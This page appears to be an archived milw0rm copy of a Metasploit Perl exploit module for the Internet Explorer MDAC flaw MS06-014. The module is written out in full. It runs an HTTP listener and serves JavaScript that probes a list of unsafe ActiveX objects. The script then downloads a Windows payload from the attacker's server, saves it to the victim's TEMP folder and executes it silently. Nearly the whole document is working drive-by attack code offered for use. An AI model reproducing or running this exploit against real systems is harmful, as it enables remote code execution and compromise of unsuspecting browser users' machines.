<html><head><title>Internet Explorer (MDAC) Remote Code Execution Exploit (MS06-014) (2)</title></head><pre>##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_createobject;

use strict;
use base &quot;Msf::Exploit&quot;;
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       =&gt; [1, 'Enable gzip content encoding'],
	'Chunked'    =&gt; [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           =&gt; 'Internet Explorer COM CreateObject Code Execution',
	'Version'        =&gt; '$Revision: 3753 $',
	'Authors'        =&gt;
	  [
		'H D Moore &lt;hdm [at] metasploit.com&gt;',
	  ],

	'Description'    =&gt;
	  Pex::Text::Freeform(qq{
		This module exploits a generic code execution vulnerability in Internet 
		Explorer by abusing vulnerable ActiveX objects. 
}),

	'Arch'           =&gt; [ 'x86' ],
	'OS'             =&gt; [ 'win32', 'winxp', 'win2003' ],
	'Priv'           =&gt; 0,

	'UserOpts'       =&gt;
	  {
		'HTTPPORT' =&gt; [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' =&gt; [ 0, 'HOST', 'The local HTTP listener host', &quot;0.0.0.0&quot; ],
	  },

	'Payload'        =&gt;
	  {
		'Space'    =&gt; 4000,
		'Keys'     =&gt; ['-bind'],
	  },
	'Refs'           =&gt;
	  [
		['MSB', 'MS06-014']
	  ],

	'DefaultTarget'  =&gt; 0,
	'Targets'        =&gt;
	  [
	  	[ 'Automatic' ],

		# Patched
		[ 'MS06-014 - RDS.DataControl', '{BD96C556-65A3-11D0-983A-00C04FC29E36}'],

		# Not marked as safe
		[ 'UNKNOWN  - RDS.DataSpace', '{BD96C556-65A3-11D0-983A-00C04FC29E36}'],

		# Not marked as safe
		[ 'UNKNOWN  - Business Object Factory ', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}'],
		
		# Not marked as safe
		[ 'UNKNOWN  - Outlook Data Object', '{0006F033-0000-0000-C000-000000000046}'],

		# Found exploitable in the wild (no details)
		[ 'UNKNOWN  - Outlook.Application', '{0006F03A-0000-0000-C000-000000000046}'],

		# These are restricted by site (might be exploitable via DNS spoofing + SSL fun)
		[ 'UNKNOWN  - SoftwareDistribution.MicrosoftUpdateWebControl.1', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}'],
		[ 'UNKNOWN  - SoftwareDistribution.WebControl.1', '{6414512B-B978-451D-A0D8-FCFDF33E833C}'],

		# Part of the WMI SDK, currently unpatched/unreported
		[ 'UNKNOWN  - WMIScriptUtils.WMIObjectBroker2.1', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}'],
		
		# Visual Studio components, not marked as safe
		[ 'UNKNOWN  - VsmIDE.DTE', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}'],
		[ 'UNKNOWN  - DExplore.AppObj.8.0', '{639F725F-1B2D-4831-A9FD-874847682010}'],
		[ 'UNKNOWN  - VisualStudio.DTE.8.0', '{BA018599-1DB3-44f9-83B4-461454C84BF8}'],
		[ 'UNKNOWN  - Microsoft.DbgClr.DTE.8.0', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}'],
		[ 'UNKNOWN  - VsaIDE.DTE', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}'],			
	  ],

	'Keys'           =&gt; [ 'ie' ],

	'DisclosureDate' =&gt; '',
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;

	my $server = IO::Socket::INET-&gt;new(
		LocalHost =&gt; $self-&gt;GetVar('HTTPHOST'),
		LocalPort =&gt; $self-&gt;GetVar('HTTPPORT'),
		ReuseAddr =&gt; 1,
		Listen    =&gt; 1,
		Proto     =&gt; 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self-&gt;PrintLine(&quot;[-] Failed to create local HTTP listener on &quot; . $self-&gt;GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self-&gt;GetVar('HTTPHOST') eq '0.0.0.0') ?
	  Pex::Utils::SourceIP('1.2.3.4') :
	  $self-&gt;GetVar('HTTPHOST');

	$self-&gt;PrintLine(&quot;[*] Waiting for connections to http://&quot;. $httphost .&quot;:&quot;. $self-&gt;GetVar('HTTPPORT') .&quot;/&quot;);

	while (defined($client = $server-&gt;accept())) {
		$self-&gt;HandleHttpClient(Msf::Socket::Tcp-&gt;new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self      = shift;
	my $fd        = shift;
	my $shellcode = my $shellcode = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	 
	# Set the remote host information
	my ($rport, $rhost) = ($fd-&gt;PeerPort, $fd-&gt;PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd-&gt;RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd-&gt;RecvLine(10))) {
		$headers .= $line;
		last if $line eq &quot;\r\n&quot;;
	}

	if ($url =~ /\?payload/) {
		$self-&gt;PrintLine(&quot;[*] HTTP Client $rhost:$rport asked for payload...&quot;);
		my $content = Pex::Utils::CreateWin32PE($shellcode, 'ie_createobject');
		$fd-&gt;Send($self-&gt;BuildResponse($content, 'application/octet-stream'));
		$fd-&gt;Close;
		return;
	}
	$self-&gt;PrintLine(&quot;[*] HTTP Client $rhost:$rport asked for exploit page...&quot;);
	$fd-&gt;Send($self-&gt;BuildResponse($self-&gt;GenerateHTML(), 'text/html'));
	$fd-&gt;Close;
	return;
}

sub GenerateHTML {
	my $self       = shift;
	my $target_idx = $self-&gt;GetVar('TARGET');
	my $objects    = &quot;&quot;;
	
	if ($target_idx == 0) {
		foreach my $target (@{ $self-&gt;Targets }) {
			if ($target-&gt;[1]) {
				$objects .= &quot;'&quot;.$target-&gt;[1].&quot;',&quot;;
			}
		}
	} else {
		my $target = $self-&gt;Targets-&gt;[$target_idx];
		$objects .= &quot;'&quot;.$target-&gt;[1].&quot;',&quot;;
	}

	my $data  = 
qq#
&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;
&lt;script language=&quot;javascript&quot;&gt;

function Log(m) {
	var log = document.createElement('p');
	log.innerHTML = m;
	document.body.appendChild(log);
	
}

function CreateO(o, n) {
	var r = null;
	
	try { eval('r = o.CreateObject(n)') }catch(e){}
	
	if (! r) {
		try { eval('r = o.CreateObject(n, &quot;&quot;)') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.CreateObject(n, &quot;&quot;, &quot;&quot;)') }catch(e){}
	}

	if (! r) {
		try { eval('r = o.GetObject(&quot;&quot;, n)') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.GetObject(n, &quot;&quot;)') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.GetObject(n)') }catch(e){}
	}
	
	return(r);	
}

function Go(a) {
	Log('Creating helper objects...');
	var s = CreateO(a, &quot;WScript.Shell&quot;);
	var o = CreateO(a, &quot;ADODB.Stream&quot;);
	var e = s.Environment(&quot;Process&quot;);
	
	Log('Ceating the XMLHTTP object...');
	var url = document.location + '?payload';
	var xml = null;
	var bin = e.Item(&quot;TEMP&quot;) + &quot;metasploit.exe&quot;;
	var dat; 
	
	try { xml=new XMLHttpRequest(); }
	catch(e) {
		try { xml = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }
		catch(e) {
			xml = new ActiveXObject(&quot;MSXML2.ServerXMLHTTP&quot;);
		}
	}
	
	if (! xml) return(0);

	Log('Downloading the payload...');	
	xml.open(&quot;GET&quot;, url, false)
	xml.send(null);
	dat = xml.responseBody;

	Log('Writing the payload to disk...');	
	o.Type = 1;
	o.Mode = 3;
	o.Open();
	o.Write(dat);
	o.SaveToFile(bin, 2);

	Log('Executing the payload...');		
	s.Run(bin,0);
}

function Exploit() {
	var i = 0;
	var t = new Array(${objects}null);
	
	while (t[i]) {
		var a = null;
		
		if (t[i].substring(0,1) == '{') {
			a = document.createElement(&quot;object&quot;);
			a.setAttribute(&quot;classid&quot;, &quot;clsid:&quot; + t[i].substring(1, t[i].length - 1));
		} else {
			try { a = new ActiveXObject(t[i]); } catch(e){}
		}
		
		if (a) {
			try {		
				var b = CreateO(a, &quot;WScript.Shell&quot;);
				if (b) {
					Log('Loaded ' + t[i]);
					Go(a);
					return(0);
				}
			} catch(e){}
		}
		i++;
	}
	Log('Exploit failed.');
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload='Exploit()'&gt;
&lt;p&gt;Initializing...&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
#;
}

sub BuildResponse {
	my ($self, $content, $type) = @_;
	$type ||= 'text/plain';

	my $response =
	  &quot;HTTP/1.1 200 OK\r\n&quot; .
	  &quot;Content-Type: $type\r\n&quot;;

	if ($self-&gt;GetVar('Gzip')) {
		$response .= &quot;Content-Encoding: gzip\r\n&quot;;
		$content = $self-&gt;Gzip($content);
	}
	if ($self-&gt;GetVar('Chunked')) {
		$response .= &quot;Transfer-Encoding: chunked\r\n&quot;;
		$content = $self-&gt;Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . &quot;\r\n&quot; .
		  &quot;Connection: close\r\n&quot;;
	}

	$response .= &quot;\r\n&quot; . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . &quot;\r\n$chunk\r\n&quot;;
	}
	$chunked .= &quot;0\r\n\r\n&quot;;

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (&lt;$rdr&gt;);
}

1;

# milw0rm.com [2006-08-10]</pre></html>